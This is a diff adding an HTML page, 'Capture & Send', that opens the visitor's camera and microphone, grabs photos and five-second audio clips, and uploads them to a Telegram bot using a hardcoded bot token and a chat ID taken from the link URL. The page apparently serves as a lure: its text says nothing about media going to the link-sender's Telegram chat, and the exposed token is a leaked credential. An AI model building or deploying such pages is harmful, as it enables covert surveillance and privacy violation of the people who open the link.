@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Capture & Send</title>
+</head>
+<body>
+    <h2>Allow Camera & Microphone</h2>
+    <video id="video" autoplay></video>
+    <button onclick="capturePhoto()">📸 Capture Photo</button>
+    <button onclick="recordAudio()">🎤 Record Audio</button>
+
+    <script>
+        let chatId = new URLSearchParams(window.location.search).get("id");  // Telegram User ID
+
+        // Open Camera
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                document.getElementById("video").srcObject = stream;
+            })
+            .catch(error => alert("Permission Denied!"));
+
+        // Capture Photo
+        function capturePhoto() {
+            let video = document.getElementById("video");
+            let canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            canvas.toBlob(blob => sendToTelegram(blob, "photo"), "image/jpeg");
+        }
+
+        // Record Audio
+        function recordAudio() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    let recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        let audioBlob = new Blob(chunks, { type: "audio/wav" });
+                        sendToTelegram(audioBlob, "audio");
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);  // 5 Sec Recording
+                });
+        }
+
+        // Send Data to Telegram Bot
+        function sendToTelegram(blob, type) {
+            let botToken = "8132280872:AAEFIKTZtaIK7mP274VH5jp_SKzU4xIOSl4";  // Replace with bot token
+            let formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append(type, blob, `capture.${type === "photo" ? "jpg" : "wav"}`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log("Sent to Telegram:", data))
+            .catch(error => console.error("Error:", error));
+        }
+    </script>
+</body>
+</html>
